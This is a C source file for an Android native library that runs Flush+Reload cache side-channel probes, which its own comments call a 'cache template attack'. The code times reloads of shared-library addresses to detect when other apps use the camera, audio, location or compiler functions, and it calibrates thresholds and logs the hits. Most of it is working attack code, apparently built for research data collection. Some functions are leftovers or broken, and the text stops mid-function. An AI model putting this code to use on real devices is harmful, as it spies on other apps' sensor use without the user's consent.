/* See LICENSE file for license and copyright information */
/*
Keep scanning functions to get the access time to check if there are functions activated(used by other app).
*/
#define _GNU_SOURCE
#define SHM_NAME "timing_count_mem"
#define ASHMEM_DEVICE    "/dev/ashmem"

//#include <sys/mman.h>
#define _GNU_SOURCE

#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <getopt.h>
#include <inttypes.h>
#include <sched.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <android/log.h>
#include <libflush/libflush.h>

#include "configuration.h"
#include "lock.h"
#include "libflush.h"


#ifdef WITH_THREADS


#include <pthread.h>
#include <jni.h>
#include "threads.h"
#include "string.h"
#include <linux/ashmem.h>
#include <sys/mman.h>


#else
#ifndef WITH_ANDROID
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#else
#include <linux/ashmem.h>
#endif
#include <android/log.h>
static int shared_data_shm_fd = 0;
#endif

#include "hit.h"
#include "logoutput.h"
#include "calibrate.h"

#define BIND_TO_CPU 0

#define LENGTH(x) (sizeof(x)/sizeof((x)[0]))

///* Shared data */
//typedef struct shared_data_s {
//    unsigned int current_offset;
//    lock_t lock;
//} shared_data_t;
//
//static shared_data_t* shared_data = NULL;

/* Forward declarations */
static void
attack_slave(libflush_session_t *libflush_session, int sum_length, pthread_mutex_t *g_lock,
             int compiler_position,
             int *continueRun, int threshold, int *flags, long *times, int *thresholds, int *logs,
             int *log_length, size_t *addr, int *camera_pattern, int *audio_pattern,
             int *length_of_camera_audio);

static bool is_address_in_use(libflush_session_t *libflush_session, void *address, int threshold);

static void
is_address_in_use1(libflush_session_t *libflush_session, void *address, int threshold, int count);

static void is_address_in_use7(libflush_session_t *libflush_session, void *address, int threshold,
                               long *timingCount,
                               long *times, int *logs, long *timingCounts, long *addresses,
                               int *log_length, pthread_mutex_t *g_lock, long *buffer,
                               int *hitCounts, int *pauses, int addressId, int pauseVal, int hitVal,
                               bool resetHitCounter);

static int
is_address_in_use_adjust(libflush_session_t *libflush_session, void *address, int threshold);

bool scan_cfg(libflush_session_t *libflush_session, int threshold);

bool scan_cfg1(libflush_session_t *libflush_session, int threshold);

/*
#define TAG_NAME "libflush"
#define log_err(fmt,args...) __android_log_print(ANDROID_LOG_ERROR, TAG_NAME, (const char *) fmt, ##args)
*/

//int ashmem_create_region(const char *name, size_t size) {
//    int fd, ret;
//    //打开"/dev/ashmem"设备文件
//    fd = open(ASHMEM_DEVICE, O_RDWR);
//    if (fd < 0)
//        return fd;
//    //根据Java空间传过来的名称修改设备文件名
//    if (name) {
//        char buf[ASHMEM_NAME_LEN];
//        strlcpy(buf, name, sizeof(buf));
//        ret = ioctl(fd, ASHMEM_SET_NAME, buf);
//        if (ret < 0)
//            goto error;
//    }
//    ret = ioctl(fd, ASHMEM_SET_SIZE, size);
//    if (ret < 0)
//        goto error;
//    return fd;
//    error:
//    close(fd);
//    return ret;
//}
//
//int read_ashmem(int argc, char **argv) {
//    int shID = ashmem_create_region(SHM_NAME, 2);
//    if (shID < 0) {
//        LOGD("ashmem_create_region failed\n");
//        return 1;
//    }
//    // right here /dev/ashmem/test_mem is deleted
//    LOGD("ashmem_create_region: %d\n", shID);
//    char *sh_buffer = (char *) mmap(NULL, 2, PROT_READ | PROT_WRITE, MAP_SHARED, shID, 0);
//    if (sh_buffer == (char *) -1) {
//        LOGD("mmap failed");
//        return 1;
//    }
//    LOGD("PID=%d", getpid());
//    do {
//        LOGD("VALUE = 0x%x\n", sh_buffer[0]);
//    } while (getchar());
//    return 0;
//}
//
//
//int write_ashmem() {
//    int shID = ashmem_create_region(SHM_NAME, 2);
//    if (shID < 0) {
//        perror("ashmem_create_region failed\n");
//        return 1;
//    }
//    LOGD("ashmem_create_region: %d\n", shID);
//    char *sh_buffer = (char *) mmap(NULL, 2, PROT_READ | PROT_WRITE, MAP_SHARED, shID, 0);
//    if (sh_buffer == (char *) -1) {
//        perror("mmap failed");
//        return 1;
//    }
//    LOGD("PID=%d\n", getpid());
//    int ch = getchar();
//    sh_buffer[0] = ch;
//    LOGD("Written 0x%x\n", ch);
//    munmap(sh_buffer, 2);
//    close(shID);
//    return 0;
//}


static void
attack_slaveX(libflush_session_t *libflush_session, int sum_length, pthread_mutex_t *g_lock,
              int compiler_position,
              int *continueRun, int threshold, int *flags, long *times, int *thresholds, int *logs,
              int *log_length, size_t *addr, int *camera_pattern, int *audio_pattern,
              int *length_of_camera_audio) {
    LOGD("Start Scaning.");
    struct timeval tv;//for quering time stamp
    /* Initialize libflush */
    libflush_init(&libflush_session, NULL);
    int turns = 0;
    int length = compiler_position;
    while (1) {
        size_t count;
        if (turns >= 100000) {//get 100000 runs, stop the compiler scan
            LOGD("Turns %d", turns);
            length = compiler_position;
            turns = 0;
        }
        for (int j = 0; j < length; j++) {
            if (addr[j] == 0)
                continue;
            if (j == 2) continue;
            if (j == 1) {//scan list of camera and audio
                for (int i = 0; i < length_of_camera_audio[0]; i++) {
                    void *target = (void *) *((size_t *) addr[1] + i);

                    if (target == 0) {//if the target is 0, skip it.
                        continue;
                    }
                    count = libflush_reload_address_and_flush(libflush_session,
                                                              target);//load the address into cache set and flush out to get the count
                    if (count <= threshold) {
                        gettimeofday(&tv, NULL);
                        LOGD("Camera hit %d-%d-%d.", j, i, count);
                        //compiler
//                        logs[*log_length] = 10000 +
                        i;//1XXXX means camera set(it's only for our data collection and analysis)
//                        times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
//                        thresholds[*log_length] = count; //record the count in thresholds list

                        pthread_mutex_lock(g_lock);
                        *log_length = (*log_length + 1) % 99000;
                        camera_pattern[i] = 1; //mark the activated pattern
                        flags[j] = 1; //flag to denote activation
                        pthread_mutex_unlock(g_lock);
                    }
                }
                for (int i = 0; i < length_of_camera_audio[1]; i++) {//the same as above
                    void *target = (void *) *((size_t *) addr[j + 1] + i);
                    if (target == 0) {//if the target is 0, skip it.
                        continue;
                    }
                    count = libflush_reload_address_and_flush(libflush_session, target);
                    if (count <= threshold) {
                        gettimeofday(&tv, NULL);
                        LOGD("Audio hit %d-%d-%d.", j + 1, i, count);
                        //compiler
//                        logs[*log_length] = 20000 +
//                                            i;//2XXXX means camera set(it's only for our data collection and analysis)
//                        times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
//                        thresholds[*log_length] = count;

                        pthread_mutex_lock(g_lock);
                        *log_length = (*log_length + 1) % 99000;
                        audio_pattern[i] = 1;
                        flags[j + 1] = 1;
                        pthread_mutex_unlock(g_lock);
                    }
                }
            } else if (addr[j] != 0) {//j==0 3
                void *target = (void *) addr[j];
                count = libflush_reload_address_and_flush(libflush_session, target);
                if (count <= threshold) {
                    gettimeofday(&tv, NULL);
                    //compiler
//                    logs[*log_length] = j;
//                    times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
//                    thresholds[*log_length] = count;
                    pthread_mutex_lock(g_lock);
                    *log_length = (*log_length + 1) % 99000;
                    pthread_mutex_unlock(g_lock);
                    if (j < 5) {
                        LOGD("Cache hit %d-%d.", j, count);
                        pthread_mutex_lock(g_lock);
                        *log_length = (*log_length + 1) % 99000;
                        flags[j] = 1;
                        pthread_mutex_unlock(g_lock);
                        if (j ==
                            4) {//if j=4 and count<thresh, we will include the compiler functions.(0 for query,1 for camera, 2 for audio, 3 for location ,4-sum_length is the compiler function)
                            length = sum_length;
                        }
                    }
                }
            }
        }
        turns++;
        usleep(50);//sleep to reduce cpu usage
        while (*continueRun == 0)
            sleep(1);
    }
    LOGD("Finish stage 1.1.\n");
}

void
stage1_(int *arr, size_t threshold, int *length_of_camera_audio, size_t *addr, int *camera_audio,
        int *finishtrial1, int sum_length) {
    LOGD("Start stage 1.1.\n");
    /* Initialize libflush */
    libflush_session_t *libflush_session;
    libflush_init(&libflush_session, NULL);
    if (threshold == 9999) {//if caliberation failed
        return;
    }
    int turns = 0;
    int length = 5;
    while (*finishtrial1 == 0) {
        size_t count;
        if (turns >= 100000) {
            LOGD("Turns %d", turns);
            length = 5;
            turns = 0;
        }
        for (int j = 0; j < length; j++) {
            if (addr[j] == 0)
                continue;
            if (j == 2) continue;
            if (j == 1) {
                for (int i = 0; i < length_of_camera_audio[0]; i++) {
                    void *target = (void *) *((size_t *) addr[1] + i);
                    if (target == 0) {//if the target is 0, skip it.
                        continue;
                    }
                    count = libflush_reload_address_and_flush(libflush_session, target);
                    if (count <= threshold) {
                        LOGD("Camera target %d-%p.", i, target);
                        *((size_t *) addr[1] + i) = 0;//target to 0
                        arr[i] = 1;
                        break;
                    }
                }
                for (int k = length_of_camera_audio[0];
                     k < length_of_camera_audio[0] + length_of_camera_audio[1]; k++) {
                    int i = k - length_of_camera_audio[0];
                    void *target = (void *) *((size_t *) addr[2] + i);
                    if (target == 0) {//if the target is 0, skip it.
                        continue;
                    }
                    count = libflush_reload_address_and_flush(libflush_session, target);
                    if (count <= threshold) {
                        LOGD("Audio target %d-%p.", i, (void *) target);
                        *((size_t *) addr[2] + i) = 0;//target to 0
                        arr[k] = 1;
                        break;
                    }
                }
            } else if (addr[j] != 0) {//j==0 3
                void *target = (void *) addr[j];
                count = libflush_reload_address_and_flush(libflush_session, target);
                if (count <= threshold && j < 4) {
                    LOGD("Target %d-%d-%p.", j, (int) count, target);
                    //length = sum_length;
                }
                if (count <= threshold && j == 4) {
                    LOGD("Compiler activated", j, count, addr[j]);
                    length = sum_length;
                }
            }
        }
        turns++;
        usleep(50);//sleep to reduce cpu usage
    }
    LOGD("Finish stage 1.1.\n");
    libflush_terminate(libflush_session);
}

void
stage1(int *arr, size_t threshold, int *length_of_camera_audio, size_t *addr, int *camera_audio,
       int *finishtrial1) {
    LOGD("Start stage 1.\n");
    /* Initialize libflush */
    libflush_session_t *libflush_session;
    libflush_init(&libflush_session, NULL);
    if (threshold == 9999) {//if caliberation failed
        return;
    }
    while (*finishtrial1 == 0) {
        int max_n = 0;
        int index = 0;
        size_t temp = 0;
        size_t count;
        int n = 0;
        for (int x1 = 0; x1 < length_of_camera_audio[0] +
                              length_of_camera_audio[1]; x1++) {//check which address raised more activation
            int nn[2] = {0};
            if (x1 < length_of_camera_audio[0] && *((size_t *) addr[1] + x1) == 0)
                continue;//if the addr is zero, no need to check
            if (x1 >= length_of_camera_audio[0] &&
                *((size_t *) addr[2] + x1 - length_of_camera_audio[0]) == 0)
                continue;//if the addr is zero, no need to check
            for (int j = 0; j < 2; j++) {
                if (j == 1 && x1 < length_of_camera_audio[0]) {//
                    temp = *((size_t *) addr[1] + x1);
                    *((size_t *) addr[1] + x1) = 0;
                }
                if (j == 1 && x1 >= length_of_camera_audio[0]) {
                    temp = *((size_t *) addr[2] + x1 - length_of_camera_audio[0]);
                    *((size_t *) addr[2] + x1 - length_of_camera_audio[0]) = 0;
                }
                for (int i = 0; i < length_of_camera_audio[0]; i++) {
                    size_t target = *((size_t *) addr[1] + i);
                    if (target == 0) {//if the target is 0, skip it.
                        continue;
                    }
                    count = libflush_reload_address_and_flush(libflush_session, (void *) target);
                    if (count <= threshold) {
                        //LOGD("Camera target %d-%p.", i, target);
                        nn[j]++;
                    }
                }
                for (int k = length_of_camera_audio[0];
                     k < length_of_camera_audio[0] + length_of_camera_audio[1]; k++) {
                    int i = k - length_of_camera_audio[0];
                    size_t target = *((size_t *) addr[2] + i);
                    if (target == 0) {//if the target is 0, skip it.
                        continue;
                    }
                    count = libflush_reload_address_and_flush(libflush_session, (void *) target);
                    if (count <= threshold) {
                        //LOGD("Audio target %d-%p.", k, target);
                        nn[j]++;
                    }
                }
                if (j == 1 && x1 < length_of_camera_audio[0]) {
                    *((size_t *) addr[1] + x1) = temp;
                }
                if (j == 1 && x1 >= length_of_camera_audio[0]) {
                    *((size_t *) addr[2] + x1 - length_of_camera_audio[0]) = temp;
                }
            }
            n = nn[0] - nn[1];//how many false activation are eliminated after setting index as 0
            if (n > max_n) {
                max_n = n;
                index = x1;
            }
        }
        //eliminate the address with more activations
        if (max_n < 4) break;
        if (index < length_of_camera_audio[0]) {
            LOGD("Eliminate Camera Address %p %d", (void *) *((size_t *) addr[1] + index), max_n);
            *((size_t *) addr[1] + index) = 0;
        } else {
            LOGD("Eliminate Audio Address %p %d",
                 (void *) *((size_t *) addr[2] + index - length_of_camera_audio[0]), max_n);
            *((size_t *) addr[2] + index - length_of_camera_audio[0]) = 0;
        }
        arr[index] = 1;
    }
    //stage1_(arr,threshold, length_of_camera_audio, addr, camera_audio, finishtrial1);
    LOGD("Finish stage 1.\n");
    libflush_terminate(libflush_session);
}

int
adjust_threshold(int threshold, int *length_of_camera_audio, size_t *addr, int *camera_audio,
                 int *finishtrial1) {
    LOGD("Start adjusting threshold.\n");
    /* Initialize libflush */
    libflush_session_t *libflush_session;
    libflush_init(&libflush_session, NULL);
    if (threshold == 9999) {//if caliberation failed
        return threshold;
    }
    size_t t = 0;
    int f = 0;
    while (1) {
        size_t n = 0;
        size_t count;
        int threshold_pre = threshold;
        for (int j = 0; j < 1000; j++) {
            for (int i = 0; i < length_of_camera_audio[0]; i++) {
                size_t target = *((size_t *) addr[1] + i);
                if (target == 0) {//if the target is 0, skip it.
                    continue;
                }
                count = libflush_reload_address_and_flush(libflush_session, (void *) target);
                if (count <= threshold) {
                    n++;
                }
            }
            for (int k = length_of_camera_audio[0];
                 k < length_of_camera_audio[0] + length_of_camera_audio[1]; k++) {
                int i = k - length_of_camera_audio[0];
                size_t target = *((size_t *) addr[2] + i);
                if (target == 0) {//if the target is 0, skip it.
                    continue;
                }
                count = libflush_reload_address_and_flush(libflush_session, (void *) target);
                if (count <= threshold) {
                    n++;
                }
            }
        }
        if (n > t / 2 || f == 0) {//if there is a big gap between two threshold
            f = 1;
            t = n;
            threshold -= 20;
            LOGD("Threshold decrease to %d", threshold);
            if (threshold < 0) {//if the caliberation went wrong, use the original threshold.
                libflush_terminate(libflush_session);
                return threshold_pre;
            }
            continue;
        }
        threshold += 20;
        break;
    }
    LOGD("Finish adjusting threshold with %d.\n", threshold);
    libflush_terminate(libflush_session);
    return threshold;
}

int
adjust_threshold1(int threshold, size_t *addr, int length) {
    LOGD("Start adjusting threshold.\n");
    /* Initialize libflush */
    libflush_session_t *libflush_session;
    libflush_init(&libflush_session, NULL);
    if (threshold == 9999) {//if caliberation failed
        return threshold;
    }
    size_t t = 0;
    int f = 0;
    while (1) {
        size_t n = 0;
        size_t count;
        int threshold_pre = threshold;
        for (int j = 0; j < 1000; j++) {
            for (int i = 0; i < length; i++) {
                size_t target = *((size_t *) addr[1] + i);
                if (target == 0) {//if the target is 0, skip it.
                    continue;
                }
                count = libflush_reload_address_and_flush(libflush_session, (void *) target);
                if (count <= threshold) {
                    n++;
                }
            }
        }
        if (n > t / 2 || f == 0) {//if there is a big gap between two threshold
            f = 1;
            t = n;
            threshold -= 20;
            LOGD("Threshold decrease to %d", threshold);
            if (threshold < 0) {//if the caliberation went wrong, use the original threshold.
                libflush_terminate(libflush_session);
                return threshold_pre;
            }
            continue;
        }
        threshold += 20;
        break;
    }
    LOGD("Finish adjusting threshold with %d.\n", threshold);
    libflush_terminate(libflush_session);
    return threshold;
}


int hit(pthread_mutex_t *g_lock, int compiler_position, int *continueRun, int threshold, int *flags,
        long *times, int *thresholds, int *logs, int *log_length, int sum_length,
        size_t *addr, int *camera_pattern, int *audio_pattern, int *length_of_camera_audio) {
    LOGD("Start.\n");
    /* Initialize libflush */
    libflush_session_t *libflush_session;
    libflush_init(&libflush_session, NULL);
    /* Start cache template attack */
    LOGD("[x] Threshold: %d\n", threshold);
//    LOGD("JobService\n");
    int foo = 16;
    void *address = &foo;
//    mprotect(address, sysconf(_SC_PAGESIZE), PROT_READ|PROT_EXEC);


    // Use the flush instruction (if possible)
    libflush_flush(libflush_session, address);
    scan_cfg(libflush_session, threshold);
    scan_cfg1(libflush_session, threshold);

    libflush_terminate(libflush_session);
    return 0;
}

int hit2(char **param, int length, int threshold) {
    LOGD("Start AddressScan hit2.\n");

    /* Initialize libflush */
    libflush_session_t *libflush_session;
    libflush_init(&libflush_session, NULL);
    /* Start cache template attack */
    LOGD("[x] Threshold: %d\n", threshold);
//    LOGD("JobService\n");
    int foo = 16;
    void *address = &foo;
//    int status = mprotect(param[0],sysconf(_SC_PAGE_SIZE), PROT_READ|PROT_EXEC );
//    LOGD("weather:AddressScan2: ## ", " %d", status);
//enabled
//    libflush_reload_address(libflush_session, param[0]);
    // Use the flush instruction (if possible)
    for (int i = 1; i < length; i++) {
//        status = mprotect(param[i],sysconf(_SC_PAGE_SIZE), PROT_READ|PROT_EXEC );
//        LOGD("weather:AddressScan2: ## ", " %d ", status);
//This should be enabled
//        is_address_in_use1(libflush_session, param[i], threshold);
    }
//    LOGD("weather:AddressScan2 hit2 random  ####.\n");
//    for (int i = 0; i < 10; i++) {
//        is_address_in_use1(libflush_session, address + i, threshold);
//    }
//    libflush_flush(libflush_session, param[0]);
    libflush_terminate(libflush_session);
    return 0;
}


int hit5(void *param, int length, int threshold) {
//    LOGD("Start AddressScan hit2.\n");
    libflush_session_t *libflush_session;
    libflush_init(&libflush_session, NULL);
    is_address_in_use1(libflush_session, param, threshold, 0);
//    libflush_terminate(libflush_session);


    return 0;
}

int hit6(jlong *param, int length, int threshold, int count) {
//    LOGD("Start AddressScan hit2.\n");
    libflush_session_t *libflush_session;
    libflush_init(&libflush_session, NULL);
    size_t count2;

    for (int i = 1; i < length; i++) {
//        void *target = (void *) *((size_t *) param + i);
        if (param == NULL || param + i == NULL) {
            LOGD("scan4 hit6 param null ");
            break;
        }
//        LOGD("scan4 hit6 %zu ", *(param + i));
        is_address_in_use1(libflush_session, *(param + i), threshold, count);

    }
//    for (int i = 1; i < length; i++) {
//        void *target = (void *) *((size_t *) param + i);
//        LOGD("weather:AddressScan2: Address: %lu Time taken: %d", target, 0);
//
////        is_address_in_use1(libflush_session, target, threshold);
//
//    }
    return 0;
}

int hit7(jlong *param, int length, int threshold, long *timingCount, long *times, int *logs,
         long *timingCounts, long *addresses, int *log_length, pthread_mutex_t *g_lock,
         long *buffer,
         libflush_session_t *libflush_session,
         int *hitCounts, int *pauses, int pauseVal, int hitVal, bool resetHitCounter) {

    int testV = 1;
    int *ptr;
    ptr = (int *) malloc(sizeof(int));

//    for (int i = 1; i < length; i++) {
    for (int i = 0; i < length; i++) {
        if (param == NULL || param + i == NULL) {
            LOGD("scan4 hit6 param null ");
            break;
        }

        is_address_in_use7(libflush_session, (void *) *(param + i), threshold, timingCount, times,
                           logs,
                           timingCounts, addresses, log_length, g_lock, buffer, hitCounts, pauses,
                           i, pauseVal, hitVal, resetHitCounter);
    }
    free(ptr);
    return 0;
}


int
adjust_threshold2(jlong *param, int length, int threshold, libflush_session_t *libflush_session) {

    size_t count2;

    for (int j = 0; j < 5000; j++) {
        for (int i = 0; i < length; i++) {
//        void *target = (void *) *((size_t *) param + i);
            if (param == NULL || param + i == NULL) {
                LOGD("adjust_threshold param null ");
                break;
            }
//        LOGD("adjust_threshold address %zu ", *(param + i));

            threshold = is_address_in_use_adjust(libflush_session, (void *) *(param + i),
                                                 threshold);

        }
    }
//    for (int i = 1; i < length; i++) {
//        void *target = (void *) *((size_t *) param + i);
//        LOGD("weather:AddressScan2: Address: %lu Time taken: %d", target, 0);
//
////        is_address_in_use1(libflush_session, target, threshold);
//
//    }
    return threshold;
}


int charToBin(unsigned char letter) {
    int binary[8];
    for (int n = 0; n < 8; n++)
        binary[7 - n] = (letter >> n) & 1;
    /* print result */
    for (int n = 0; n < 8; n++)
        LOGD("%d -> %d", n, binary[n]);
    //LOGD("OdexScan:: Address: binary finished\n");
    return 0;
}


int scanOdexMemory(void *param, int length, int threshold) {
//    LOGD("Start AddressScan hit2.\n");
////    LOGD("OdexScan:: Address: %lu Time taken:", param);
////    LOGD("OdexScan: %p", (void *)&0x7078cc0000 );
//
//    char* c = (char*)param;
//    for(int i = 0; i < 100 ; i++)
//    {
//        LOGD("OdexScan:: Address: %s reading :", c[i]);
//    }

    unsigned char *c2 = (unsigned char *) param;;
    unsigned char a[8];
    LOGD("OdexScan:: Address:start for : %lu", param);
    for (int i = 0; i < 8; i++) {
        a[i] = (unsigned) *(unsigned char *) (c2 + i);
        charToBin(a[i]);
    }
    LOGD("OdexScan:: Address:finished : %lu", param);

//    unsigned char a1[8];
////    char* c3 = (char*)param;
//    (unsigned)*(unsigned char*)c3
//    for(int i = 0; i < 8 ; i++)
//    {
//        a[i] = (unsigned)*(unsigned char*)c3[i];
//    }
//


    //LOGD("OdexScan:: Address: %02x reading :", (unsigned)*(unsigned char*)c2);
    //LOGD("OdexScan:: Address: %lu reading %s :", param, (unsigned)*(unsigned char*)c2);

//    is_address_in_use1(libflush_session, param, threshold);


    return 0;
}

bool scan_cfg(libflush_session_t *libflush_session, int threshold) {
//    /* Initialize libflush */
//    libflush_session_t *libflush_session;
//    libflush_init(&libflush_session, NULL);

    int foo = 16;
    void *address = &foo;

    // Use the flush instruction (if possible)
    if (is_address_in_use(libflush_session, address, threshold)) {
//        LOGD("JobService true\n");
        return true;
    };
//    LOGD("JobService flushed address!!!\n");
    return false;
}

bool scan_cfg1(libflush_session_t *libflush_session, int threshold) {
//    /* Initialize libflush */
//    libflush_session_t *libflush_session;
//    libflush_init(&libflush_session, NULL);

    int foo = 16;
    void *address = &foo;

    FILE *fp = fopen("/sdcard/scan-address.txt", "r");
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    if (fp == NULL)
        exit(EXIT_FAILURE);

    while ((read = getline(&line, &len, fp)) != -1) {
        LOGD("AddressSca1 Retrieved line of length %zu:\n", read);
        LOGD("AddressSca1 %s", line);
    }

    fclose(fp);
    if (line)
        free(line);
    return false;
}

//get the threshold
int get_threshold() {
    LOGD("Start get_threshold.\n");
    /* Initialize libflush */
    int threshold = 0;
    libflush_session_t *libflush_session;
    libflush_init(&libflush_session, NULL);
    /* Start calibration */
    threshold = calibrate(libflush_session);//calibrate the threshold
    LOGD("Currently the threshold is %d", threshold);
    if (threshold == 9999)
        return threshold;
    /* Terminate libflush */
    //LOGD("Be adjusted to %d.\n",threshold);
//    gives the error
    libflush_terminate(libflush_session);
    return threshold;
}

int get_threshold_wsessiom(libflush_session_t *libflush_session) {
    LOGD("Start get_threshold.\n");
    /* Initialize libflush */
    int threshold = 0;
    /* Start calibration */
    threshold = calibrate(libflush_session);//calibrate the threshold
    LOGD("Currently the threshold is %d", threshold);
    if (threshold == 9999)
        return threshold;
    /* Terminate libflush */
    //LOGD("Be adjusted to %d.\n",threshold);
//    gives the error
//   libflush_terminate(libflush_session);
    return threshold;
}

long get_timingCount(pthread_mutex_t *g_lock, long *timingCount) {
    long timingCnt = 0l;
//    pthread_mutex_lock(g_lock);
    timingCnt = *timingCount;
//    pthread_mutex_unlock(g_lock);
    return timingCnt;
}

//when use static, the location function keeps poping
static void
attack_slave(libflush_session_t *libflush_session, int sum_length, pthread_mutex_t *g_lock,
             int compiler_position,
             int *continueRun, int threshold, int *flags, long *times, int *thresholds, int *logs,
             int *log_length, size_t *addr, int *camera_pattern, int *audio_pattern,
             int *length_of_camera_audio) {
    struct timeval tv;//for quering time stamp
    //gettimeofday(&tv,NULL);
    libflush_init(&libflush_session, NULL);
    /* Run Flush and reload */
    //uint64_t start = libflush_get_timing(libflush_session);
    int turns = 0;
    int length = compiler_position;
    //*running = 1;
    LOGD("[x] start scaning %d", compiler_position);
    while (1) {
        // if the turns reached 10000 or the same offset was hit more than many times repetitively, shrink the list;
        if (turns >= 100000) {
            LOGD("Turns %d", turns);
            length = compiler_position;
            turns = 0;
        }
        //Traverse all addresses
        for (int crt_ofs = 0; crt_ofs < length; crt_ofs++) {
            if (addr[crt_ofs] == 0)
                continue;
            size_t count;
            size_t *target = (size_t *) addr[crt_ofs];
//            mprotect(target-1, sysconf(_SC_PAGESIZE)*2, PROT_READ);

            if (crt_ofs == 1 || crt_ofs == 2) {
                int c = crt_ofs - 1;
                for (int i = 0; i < length_of_camera_audio[c]; i++) {
                    //load the address into cache to count the time, and then flush out
                    if (*(target + i) == 0)
                        continue;
                    //if(crt_ofs==2){
                    //    LOGD("[%d] cache hit %p %d", crt_ofs, *((size_t *)addr[crt_ofs] + i), count);
                    //}
                    count = libflush_reload_address_and_flush(libflush_session,
                                                              (void *) *(target + i));
                    if (count <= threshold) {
                        gettimeofday(&tv, NULL);
                        pthread_mutex_lock(g_lock);
                        flags[crt_ofs] = 1;//here I have got all functions' activation
                        pthread_mutex_unlock(g_lock);
                        LOGD("[%d] cache hit %d %d", crt_ofs, i, (int) count);
                        //get the pattern
                        pthread_mutex_lock(g_lock);
                        if (crt_ofs == 1)
                            camera_pattern[i] = 1;
                        else
                            audio_pattern[i] = 1;
                        pthread_mutex_unlock(g_lock);
//                        times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
//                        thresholds[*log_length] = (int) count;

                        pthread_mutex_lock(g_lock);
//                        logs[(*log_length)++] = crt_ofs * 10000 + i;
                        pthread_mutex_unlock(g_lock);

                        if (*log_length >= 99000) {
                            LOGD("Log Length is larger than the threshold, set to 0.");
                            pthread_mutex_lock(g_lock);
                            *log_length = 0;
                            pthread_mutex_unlock(g_lock);
                        }

                    }
                }
                continue;
            }
            //load the address into cache to count the time, and then flush out
            count = libflush_reload_address_and_flush(libflush_session, (void *) target);
            //LOGD("cache hit %d %d", crt_ofs, count);
            if (count <= threshold) {
                gettimeofday(&tv, NULL);
                //LOGD("cache hit %p %d %ld", (void*) (addr[crt_ofs]),count, tv.tv_sec*1000+tv.tv_usec/1000);
                // if current offset is the switch of compiler, expand the list.
                if (crt_ofs == compiler_position - 1) {
                    LOGD("Compiler was activated.");
                    length = sum_length;
                    turns = 0;
                }
                //record the activation
                if (crt_ofs < compiler_position - 1) {
                    pthread_mutex_lock(g_lock);
                    flags[crt_ofs] += 1;//here I have got all functions' activation
                    pthread_mutex_unlock(g_lock);
                    LOGD("cache hit %d %d %p", crt_ofs, (int) count, (void *) target);
                }
                if (*log_length >= 99000) {
                    LOGD("Log Length is larger than 50000, set to 0.");
                    pthread_mutex_lock(g_lock);
                    *log_length = 0;
                    pthread_mutex_unlock(g_lock);
                }
//                times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
//                thresholds[*log_length] = (int) count;

                pthread_mutex_lock(g_lock);
//                logs[(*log_length)++] = crt_ofs;
                pthread_mutex_unlock(g_lock);
            }
        }//traverse all functions
        turns++;
        usleep(50);//sleep to reduce cpu usage
        while (*continueRun == 0)
            sleep(1);
    }
}

static bool
is_address_in_use(libflush_session_t *libflush_session, void *address, int threshold) {
    int i = 0;
    size_t count1;
    size_t count2;

    for (i = 0; i < 100; i++) {
        libflush_flush(libflush_session, address + i);
        count1 = libflush_reload_address_and_flush(libflush_session, address + i);
        count2 = libflush_reload_address(libflush_session, address + i);
        count2 = libflush_reload_address(libflush_session, address + i);

        LOGD("AddressScan: not_in_cache: %d in_cache: %d", count1, count2);
    }
//    size_t count = libflush_reload_address_and_flush(libflush_session, address);
//    LOGD("JobService %d first", count);
//    count = libflush_reload_address_and_flush(libflush_session, address+1);
//    LOGD("JobService %d second", count);
    LOGD("AddressScan: threshold %d ", threshold);
    if (count1 <= threshold) {
        return true;
    }
    return false;
}

static void
is_address_in_use1(libflush_session_t *libflush_session, void *address, int threshold, int count) {
//    LOGD("scan4: Address: %lu", address);

    int i = 0;

    size_t count2;

    count2 = libflush_reload_address_and_flush(libflush_session, address);
///    count2 = libflush_probe(libflush_session, address);
//    LOGD("Count %d Address: %lu Time taken: %d", count, address, count2);


//    if (count2 < 800) {
//        LOGD("weather:AddressScan2: Address: %lu Time taken: %d", address, count2);
//    }

}

static void
is_address_in_use7(libflush_session_t *libflush_session, void *address, int threshold,
                   long *timingCount, long *times, int *logs, long *timingCounts, long *addresses,
                   int *log_length, pthread_mutex_t *g_lock, long *buffer, int *hitCounts,
                   int *pauses, int addressId, int pauseVal, int hitVal, bool resetHitCounter) {
//    LOGD("scan4: Address: %lu", address);

//    *timingCount = (*timingCount + 1);
    int i = addressId;

    size_t scanTime;
    scanTime = libflush_reload_address_and_flush(libflush_session, address);
//        LOGD("weather:AddressScan2: Address: %lu Time taken: %d", address, scanTime);


    if (scanTime < threshold) {
        if (pauses[i] > pauseVal || hitCounts[i] > 0) {
            hitCounts[i]++;
        }
        pauses[i] = 0;
    } else {
        pauses[i]++;
        hitCounts[i] = 0;
    }


    if (*log_length >= 99000) {
        pthread_mutex_lock(g_lock);
        *log_length = 0;
        pthread_mutex_unlock(g_lock);
        LOGD("Log Length is larger than 50000, set to 0.");

    }
    struct timeval tv;//for quering time stamp
    gettimeofday(&tv, NULL);

//    if (hitCounts[i] > hitVal) {
//    if (scanTime < threshold+30) {
//        LOGD("sidescandb inside hit");
        if (resetHitCounter) {
            LOGD("resetHitCounter: %d", resetHitCounter);

            hitCounts[i] = 0;
        }
        pthread_mutex_lock(g_lock);
        logs[*log_length] = scanTime;
        addresses[*log_length] = address;
//    times[*log_length] = count;
        times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
        timingCounts[*log_length] = buffer[0];
        *log_length = (*log_length + 1) % 99000;
//        *timingCount = (*timingCount + 1);
        pthread_mutex_unlock(g_lock);
//    }


}


int getNanoSecondTiming() {
    struct timespec ts;
//    timespec_get(&ts, TIME_UTC);
    char buff[100];
    strftime(buff, sizeof buff, "%D %T", gmtime(&ts.tv_sec));
    printf("Current time: %s.%09ld UTC\n", buff, ts.tv_nsec);
}


static int
is_address_in_use_adjust(libflush_session_t *libflush_session, void *address, int threshold) {
//    LOGD("adjust_threshold inside is_address_in_use_adjust");
    size_t count2;
